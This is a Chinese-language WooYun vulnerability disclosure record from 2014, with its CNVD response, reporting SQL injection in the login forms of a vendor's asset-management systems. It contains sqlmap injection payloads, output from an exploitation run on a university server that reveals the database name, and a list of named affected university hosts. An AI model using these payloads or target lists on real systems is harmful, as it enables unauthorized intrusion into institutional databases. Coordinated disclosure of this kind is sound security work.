{"id": 55794, "wybug_id": "wooyun-2014-059902", "wybug_title": "某通用型资产管理平台多个系统存在SQL注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-05-08 14:37", "wybug_open_date": "2014-08-06 14:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向公众公开  简要描述： 某通用型资产管理平台，存在多个分属系统，共达13个，这13个系统都存在SQL注入~~~ 详细说明：  北京普诺迪信息系统技术研发有限责任公司官网：http://www.bjprd.com.cn/index.asp软件演示：http://www.bjprd.com.cn/lecture.asp\n\n资产管理平台：http://www.bjprd.com.cn/zcpt/index.asp看资产管理这里，一共有13个分属管理系统：\n\n设备仪器管理系统：http://www.bjprd.com.cn/sbweb/index.asp资产汇总与分析系统：http://www.bjprd.com.cn/zcgkweb/login.asp家具被服装具管理系统：http://www.bjprd.com.cn/jjweb/index.asp......等等，不一一列出来了。这些系统都需要登录后才能使用管理功能。但是就是在登录这里存在SQL注入。更严重的是这里的username和password都存在注入，说明这里的password是明文传输和存储的，有木有~~~   漏洞证明：  官方演示系统证明：资产汇总与分析系统：http://www.bjprd.com.cn/zcgkweb/login.asp链接：http://www.bjprd.com.cn/zcgkweb/userslogin.asp?uid=123123123&pwd=123\nsqlmap identified the following injection points with a total of 114 HTTP(s) requests:---Place: GETParameter: uid    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: uid=123123123'; WAITFOR DELAY '0:0:5'--&pwd=123    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: uid=123123123' WAITFOR DELAY '0:0:5'--&pwd=123Place: GETParameter: pwd    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: uid=123123123&pwd=123'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: uid=123123123&pwd=123' WAITFOR DELAY '0:0:5'-----\n家具被服装具管理系统：http://www.bjprd.com.cn/jjweb/index.asp：链接：http://www.bjprd.com.cn/jjweb/userlogin.aspPOST：username=123123123&pass=123123123\nPOST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] yPOST parameter 'pass' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 112 HTTP(s) requests:---Place: POSTParameter: username    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username=123123123'; WAITFOR DELAY '0:0:5'--&pass=123123123    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=123123123' WAITFOR DELAY '0:0:5'--&pass=123123123Place: POSTParameter: pass    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username=123123123&pass=123123123'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=123123123&pass=123123123' WAITFOR DELAY '0:0:5'-----\n这里的username和password都存在注入。实际案例证明：天津财经大学家具（被服装具）网络管理系统：http://202.113.128.61/jjweb/泉州医学高等专科学校家具（被服装具）网络管理系统：http://www.qzygz.com:8091/jjweb/拿天津财经大学家具（被服装具）网络管理系统：http://202.113.128.61/jjweb/为例：链接：http://202.113.128.61/jjweb/userlogin.aspPOST：username=123123123&pass=123123123\n[13:41:24] [INFO] testing connection to the target URL[13:41:25] [INFO] heuristics detected web page charset 'GB2312'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: username    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username=123123123'; WAITFOR DELAY '0:0:5'--&pass=123123123    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=123123123' WAITFOR DELAY '0:0:5'--&pass=123123123---[13:41:25] [INFO] testing Microsoft SQL Server[13:41:25] [INFO] confirming Microsoft SQL Server[13:41:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:41:25] [INFO] fetching current database[13:41:25] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n][13:41:40] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloads[13:41:53] [INFO] adjusting time delay to 2 seconds due to good response timesJJD[13:42:23] [ERROR] invalid character detected. retrying..[13:42:23] [WARNING] increasing time delay to 3 secondsatacurrent database:    'JJData'\n其他实际存在的，受影响的案例：天津师范大学资产综合管理平台：http://59.67.78.170:81/中南大学资产管理平台：http://202.197.61.13/天津师范大学资产与实验室综合管理概况：http://59.67.78.170:81/zcgkweb/login.asp福建中医药大学家具（被服装具）网络管理系统：http://hqglc.fjtcm.edu.cn/jjweb/西南交通大学仪器设备管理系统：http://202.115.66.234/sbweb/安徽大学仪器设备管理系统：http://sysbc.ahu.edu.cn:8001/吉林工商学院资产综合管理平台：http://zcgl.jlbtc.edu.cn/国有资产管理平台：http://202.113.128.61/贵州大学国有资产管理平台：http://210.40.3.227/.....还有很多为搜索到的案例。   修复方案：  过滤，加密password   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-05-11 21:17 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开联系渠道向北京普诺迪信息系统技术研发有限责任公司通报处置。同时将涉及案例协调教育网应急组织处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}